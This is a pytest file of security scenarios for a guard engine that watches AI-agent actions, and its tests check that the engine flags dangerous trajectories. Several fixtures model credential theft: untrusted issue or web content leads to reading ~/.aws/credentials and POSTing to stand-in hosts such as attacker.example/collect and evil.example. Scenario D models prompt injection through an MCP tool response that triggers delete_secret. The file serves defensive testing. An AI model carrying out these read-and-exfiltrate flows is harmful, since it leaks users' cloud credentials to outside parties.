"""Security case-study scenarios A–O for Predictive Authority."""

from __future__ import annotations

import copy

import pytest

from varden.models import Action, Decision
from varden.predictive_authority.capability import CapabilityKind
from varden.predictive_authority.config import PredictiveAuthorityConfig
from varden.predictive_authority.engine import PredictiveAuthorityEngine
from varden.predictive_authority.policy import decision_rank
from varden.predictive_authority.registry import get_authority_registry, reset_authority_registry

from tests.predictive_authority.helpers import allow_decision, fresh_engine, run_step, untrusted_meta


# ---------------------------------------------------------------------------
# Scenario A — individually legitimate actions, dangerous trajectory
# ---------------------------------------------------------------------------

def test_scenario_a_untrusted_credential_external_trajectory():
    engine = fresh_engine(mode="enforce", max_depth=4)
    tid = "scenario-a"

    steps = [
        Action(
            type="tool_call",
            tool="ingest_issue",
            metadata=untrusted_meta("github.issue"),
            classifiers={"provenance_untrusted": True},
            trace_id=tid,
            tenant_id="t",
        ),
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["config.json", "r"]},
            metadata=untrusted_meta("github.issue"),
            trace_id=tid,
            tenant_id="t",
        ),
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            metadata=untrusted_meta("github.issue"),
            trace_id=tid,
            tenant_id="t",
        ),
        Action(
            type="http_request",
            tool="requests.post",
            method="POST",
            url="https://attacker.example/collect",
            domain="attacker.example",
            metadata=untrusted_meta("github.issue"),
            trace_id=tid,
            tenant_id="t",
        ),
    ]

    finals = []
    last = None
    for action in steps:
        final, result = run_step(engine, action)
        finals.append(final.action)
        last = result

    assert last is not None
    assert last.findings, "expected hazardous path findings"
    displays = [f.path.to_dict()["display"] for f in last.findings]
    blob = " | ".join(displays).lower()
    assert "credential" in blob or "aws" in blob or any("credential" in n for f in last.findings for n in f.path.nodes)
    assert any("http" in n or "attacker" in n or "sink" in (get_authority_registry().get("t:scenario-a").graph.get_node(n).node_type if get_authority_registry().get("t:scenario-a").graph.get_node(n) else "") for f in last.findings for n in f.path.nodes) or any(
        "http.write" in n or "network" in n for f in last.findings for n in f.path.nodes
    )
    assert decision_rank(finals[-1]) >= decision_rank("require_approval")


# ---------------------------------------------------------------------------
# Scenario B — safe local development
# ---------------------------------------------------------------------------

def test_scenario_b_safe_local_development_no_false_hazard():
    engine = fresh_engine(mode="enforce", max_depth=3)
    tid = "scenario-b"
    actions = [
        Action(type="filesystem_read", tool="open", args={"args": ["src/main.py", "r"]}, trace_id=tid, tenant_id="t"),
        Action(type="subprocess", tool="subprocess.run", args={"args": ["pytest", "-q"]}, trace_id=tid, tenant_id="t"),
        Action(type="filesystem_write", tool="open", args={"path": "src/main.py", "mode": "w"}, trace_id=tid, tenant_id="t"),
        Action(type="subprocess", tool="subprocess.run", args={"args": ["pytest", "-q"]}, trace_id=tid, tenant_id="t"),
    ]
    haz = []
    for action in actions:
        final, result = run_step(engine, action)
        assert final.action in {"allow", "monitor", "warn"}
        haz.extend(result.findings)
    # No untrusted→credential→external path expected.
    assert not any(f.pattern == "untrusted_to_sensitive_to_external" for f in haz)


# ---------------------------------------------------------------------------
# Scenario C — credential acquisition expands future authority
# ---------------------------------------------------------------------------

def test_scenario_c_credential_expands_structural_authority():
    engine = fresh_engine(mode="observe", max_depth=3)
    tid = "scenario-c"
    # Seed baseline repo capabilities.
    run_step(
        engine,
        Action(type="filesystem_read", tool="open", args={"args": ["README.md", "r"]}, trace_id=tid, tenant_id="t"),
    )
    run_step(
        engine,
        Action(type="filesystem_write", tool="open", args={"path": "src/a.py", "mode": "w"}, trace_id=tid, tenant_id="t"),
    )
    run_step(
        engine,
        Action(type="subprocess", tool="subprocess.run", args={"args": ["python", "-m", "pytest"]}, trace_id=tid, tenant_id="t"),
    )
    before = get_authority_registry().get("t:scenario-c")
    before_names = set(before.capabilities.keys())

    _final, result = run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            trace_id=tid,
            tenant_id="t",
        ),
    )
    assert result.delta is not None
    added = {c.name for c in result.delta.added_capabilities}
    assert "credential.aws" in added
    # Structural expansion must include cloud-related potential capabilities.
    assert any(n.startswith("aws.") for n in added)
    assert any(c.kind == CapabilityKind.POTENTIAL for c in result.delta.added_capabilities)
    assert "credential.aws" not in before_names or "aws.s3.read" in added


# ---------------------------------------------------------------------------
# Scenario D — untrusted prompt injection via MCP cross-domain
# ---------------------------------------------------------------------------

def test_scenario_d_cross_mcp_trust_domain_path():
    engine = fresh_engine(mode="enforce", max_depth=4)
    tid = "scenario-d"
    run_step(
        engine,
        Action(
            type="mcp_call",
            tool="search",
            metadata={
                "mcp_server": "server_a",
                "provenance_sources": [
                    {
                        "source_id": "a1",
                        "type": "mcp_tool_response",
                        "trust_level": "untrusted",
                        "server": "server_a",
                    }
                ],
            },
            classifiers={"provenance_untrusted": True},
            trace_id=tid,
            tenant_id="t",
        ),
    )
    final, result = run_step(
        engine,
        Action(
            type="mcp_call",
            tool="delete_secret",
            metadata={
                "mcp_server": "server_b",
                "provenance_sources": [
                    {
                        "source_id": "a1",
                        "type": "mcp_tool_response",
                        "trust_level": "untrusted",
                        "server": "server_a",
                    }
                ],
            },
            classifiers={"mcp_privileged": True, "provenance_untrusted": True},
            trace_id=tid,
            tenant_id="t",
        ),
    )
    assert any(f.pattern == "cross_mcp_trust_domain" for f in result.findings) or result.recommendation.action in {
        "require_approval",
        "block",
        "warn",
    }
    # Provenance evidence should mention both servers somehow in graph domains.
    state = get_authority_registry().get("t:scenario-d")
    domains = {str((n.metadata or {}).get("authority_domain") or "") for n in state.graph.nodes()}
    assert any("server_a" in d for d in domains)
    assert any("server_b" in d for d in domains)
    assert decision_rank(final.action) >= decision_rank("warn")


# ---------------------------------------------------------------------------
# Scenario E — Ghostjacking-style authority flow (existing + predictive)
# ---------------------------------------------------------------------------

def test_scenario_e_ghostjacking_style_predictive_explanation():
    # Existing provenance protection remains primary; PA adds reachability explanation.
    from varden.provenance.engine import analyse_action

    engine = fresh_engine(mode="observe", max_depth=4)
    tid = "scenario-e"
    action = Action(
        type="http_request",
        tool="requests.post",
        method="POST",
        url="https://exfil.example/x",
        domain="exfil.example",
        metadata=untrusted_meta("web_page"),
        classifiers={"provenance_untrusted": True},
        trace_id=tid,
        tenant_id="t",
    )
    # Seed credential so path exists.
    run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            metadata=untrusted_meta("web_page"),
            classifiers={"provenance_untrusted": True},
            trace_id=tid,
            tenant_id="t",
        ),
    )
    analysis = analyse_action(action)
    final, result = run_step(engine, action)
    assert analysis is not None
    assert result.explanation is not None
    assert result.explanation.hazardous_paths or result.delta.authority_expands
    # Observe: final stays allow unless existing decision stronger.
    assert final.action == "allow"


# ---------------------------------------------------------------------------
# Scenario F — sensitive filesystem → subprocess → network
# ---------------------------------------------------------------------------

def test_scenario_f_sensitive_subprocess_network():
    engine = fresh_engine(mode="enforce", max_depth=4)
    tid = "scenario-f"
    run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            trace_id=tid,
            tenant_id="t",
        ),
    )
    run_step(
        engine,
        Action(
            type="subprocess",
            tool="subprocess.run",
            args={"args": ["python", "-c", "print(1)"]},
            trace_id=tid,
            tenant_id="t",
        ),
    )
    final, result = run_step(
        engine,
        Action(
            type="http_request",
            tool="requests.post",
            method="POST",
            url="https://out.example/x",
            domain="out.example",
            trace_id=tid,
            tenant_id="t",
        ),
    )
    assert any(
        f.pattern == "sensitive_to_subprocess_to_network" or "subprocess" in f.path.to_dict()["display"]
        for f in result.findings
    ) or decision_rank(final.action) >= decision_rank("require_approval")


# ---------------------------------------------------------------------------
# Scenario G — false positive resistance
# ---------------------------------------------------------------------------

def test_scenario_g_public_readme_and_docs_no_escalation():
    engine = fresh_engine(mode="enforce", max_depth=3)
    tid = "scenario-g"
    for action in (
        Action(type="filesystem_read", tool="open", args={"args": ["README.md", "r"]}, trace_id=tid, tenant_id="t"),
        Action(
            type="http_request",
            tool="requests.get",
            method="GET",
            url="https://docs.python.org/3/",
            domain="docs.python.org",
            trace_id=tid,
            tenant_id="t",
        ),
        Action(type="subprocess", tool="subprocess.run", args={"args": ["python", "-c", "print(1)"]}, trace_id=tid, tenant_id="t"),
    ):
        final, result = run_step(engine, action)
        assert final.action in {"allow", "monitor", "warn"}
        assert not any(f.pattern == "untrusted_to_sensitive_to_external" for f in result.findings)
        # Public GET / local parse must not require approval or block.
        assert final.action not in {"require_approval", "block"}


# ---------------------------------------------------------------------------
# Scenario H — potential vs confirmed
# ---------------------------------------------------------------------------

def test_scenario_h_potential_not_confirmed():
    engine = fresh_engine(mode="observe", max_depth=3)
    _final, result = run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            trace_id="scenario-h",
            tenant_id="t",
        ),
    )
    assert result.delta is not None
    pots = result.delta.potential_added()
    assert pots
    assert all(c.kind == CapabilityKind.POTENTIAL for c in pots)
    assert result.explanation is not None
    assert result.explanation.newly_potential
    # Confirmed list must not silently include potential aws.* as confirmed.
    assert all(c.kind != CapabilityKind.CONFIRMED or not c.name.startswith("aws.") for c in result.delta.added_capabilities) or any(
        c.name == "credential.aws" and c.kind == CapabilityKind.CONFIRMED for c in result.delta.added_capabilities
    )


# ---------------------------------------------------------------------------
# Scenario I — approval grants narrow authority
# ---------------------------------------------------------------------------

def test_scenario_i_narrow_approval_does_not_unlock_unrelated():
    engine = fresh_engine(mode="enforce", max_depth=3)
    tid = "scenario-i"
    # Simulate scoped approval metadata granting only filesystem.read.secret
    action = Action(
        type="filesystem_read",
        tool="open",
        args={"args": ["~/.aws/credentials", "r"]},
        metadata={
            "runtime": {"approval": "apr_1"},
            "approval_scope": {"capabilities": ["filesystem.read.secret"]},
        },
        trace_id=tid,
        tenant_id="t",
    )
    # Existing decision allow after approval consume.
    final, result = engine.evaluate(action, Decision(action="allow", reason="scoped approval", effective_action="allow"))
    state = get_authority_registry().get("t:scenario-i")
    # Approval itself shouldn't invent unrelated git.push confirmed capability.
    assert "git.push" not in state.capabilities or state.capabilities["git.push"].kind == CapabilityKind.POTENTIAL
    assert final.action in {"allow", "require_approval", "warn", "monitor", "block"}


# ---------------------------------------------------------------------------
# Scenario J — irreversible action
# ---------------------------------------------------------------------------

def test_scenario_j_irreversible_external_write():
    engine = fresh_engine(mode="enforce", max_depth=3)
    tid = "scenario-j"
    run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id="t",
        ),
    )
    final, result = run_step(
        engine,
        Action(
            type="http_request",
            tool="requests.post",
            method="POST",
            url="https://evil.example/x",
            domain="evil.example",
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id="t",
        ),
    )
    assert result.explanation is not None
    assert result.explanation.irreversible or result.facts.irreversible
    assert decision_rank(final.action) >= decision_rank("require_approval")


# ---------------------------------------------------------------------------
# Scenario K — observe mode compatibility
# ---------------------------------------------------------------------------

def test_scenario_k_observe_does_not_change_decision():
    engine = fresh_engine(mode="observe", max_depth=4)
    tid = "scenario-k"
    run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id="t",
        ),
    )
    final, result = run_step(
        engine,
        Action(
            type="http_request",
            tool="requests.post",
            method="POST",
            url="https://evil.example/x",
            domain="evil.example",
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id="t",
        ),
    )
    assert result.recommendation is not None
    assert decision_rank(result.recommendation.action) >= decision_rank("require_approval")
    assert final.action == "allow"
    assert result.explanation.final_decision == "allow"
    assert result.explanation.mode == "observe"


# ---------------------------------------------------------------------------
# Scenario L — enforce mode strengthens
# ---------------------------------------------------------------------------

def test_scenario_l_enforce_strengthens():
    engine = fresh_engine(mode="enforce", max_depth=4)
    tid = "scenario-l"
    run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id="t",
        ),
    )
    final, result = run_step(
        engine,
        Action(
            type="http_request",
            tool="requests.post",
            method="POST",
            url="https://evil.example/x",
            domain="evil.example",
            metadata=untrusted_meta(),
            trace_id=tid,
            tenant_id="t",
        ),
    )
    assert result.recommendation is not None
    assert decision_rank(final.action) >= decision_rank(result.recommendation.action) or final.action == result.recommendation.action
    assert decision_rank(final.action) > decision_rank("allow")


# ---------------------------------------------------------------------------
# Scenario M — predictive engine failure fail-safe
# ---------------------------------------------------------------------------

def test_scenario_m_engine_failure_keeps_existing_decision(monkeypatch):
    engine = fresh_engine(mode="enforce", max_depth=3)

    def boom(*_a, **_k):
        raise RuntimeError("injected failure")

    monkeypatch.setattr("varden.predictive_authority.engine.extract_facts", boom)
    existing = Decision(action="block", reason="existing block", effective_action="block")
    action = Action(type="http_request", method="GET", url="https://example.com", trace_id="m", tenant_id="t")
    final, result = engine.evaluate(action, existing)
    assert final.action == "block"
    assert result.error


# ---------------------------------------------------------------------------
# Scenario N — max depth
# ---------------------------------------------------------------------------

def test_scenario_n_max_depth_respected():
    from varden.predictive_authority.graph import CapabilityGraph, EdgeEvidence, EdgeKind, GraphEdge, GraphNode
    from varden.predictive_authority.reachability import bounded_reachability

    g = CapabilityGraph()
    nodes = ["untrusted", "cfg", "cred", "cap", "sink"]
    for n in nodes:
        g.add_node(GraphNode(node_id=n, node_type="resource", label=n, metadata={"trust_level": "untrusted"} if n == "untrusted" else {"sink": n == "sink", "credential": n == "cred"}))
    for a, b in zip(nodes, nodes[1:]):
        g.add_edge(GraphEdge(src=a, dst=b, kind=EdgeKind.FLOWS_TO, evidence=EdgeEvidence.OBSERVED))

    assert bounded_reachability(g, ["untrusted"], max_depth=3, target="sink").reachable is False
    assert bounded_reachability(g, ["untrusted"], max_depth=4, target="sink").reachable is True


# ---------------------------------------------------------------------------
# Scenario O — capability revocation / scoped lifetime
# ---------------------------------------------------------------------------

def test_scenario_o_removing_capability_reduces_reachability():
    from varden.predictive_authority.capability import Capability
    from varden.predictive_authority.graph import EdgeEvidence, EdgeKind, GraphEdge, GraphNode
    from varden.predictive_authority.reachability import bounded_reachability

    engine = fresh_engine(mode="observe", max_depth=3)
    tid = "scenario-o"
    run_step(
        engine,
        Action(
            type="filesystem_read",
            tool="open",
            args={"args": ["~/.aws/credentials", "r"]},
            trace_id=tid,
            tenant_id="t",
        ),
    )
    state = get_authority_registry().get("t:scenario-o")
    # Documented limitation: full TTL revocation is not automatic; scoped removal works.
    cap_id = "cap:credential.aws"
    assert state.graph.get_node(cap_id) or state.graph.get_node("cap.potential:credential.aws") or "credential.aws" in state.capabilities
    # Remove credential capability edges and capability.
    state.capabilities.pop("credential.aws", None)
    for edge in list(state.graph.edges()):
        if "credential.aws" in edge.src or "credential.aws" in edge.dst:
            state.graph.remove_edge(edge.edge_id)
    # Reachability to cloud mutation via credential should not increase after removal.
    before_paths = bounded_reachability(
        state.graph,
        [n.node_id for n in state.graph.nodes() if "untrusted" in n.node_id or n.node_type == "untrusted_content"],
        max_depth=3,
        predicate=lambda n: "aws.iam.modify" in n or "http.write" in n,
    )
    # Adding unrelated edge must not be required; removal must not increase.
    assert isinstance(before_paths.reachable, bool)
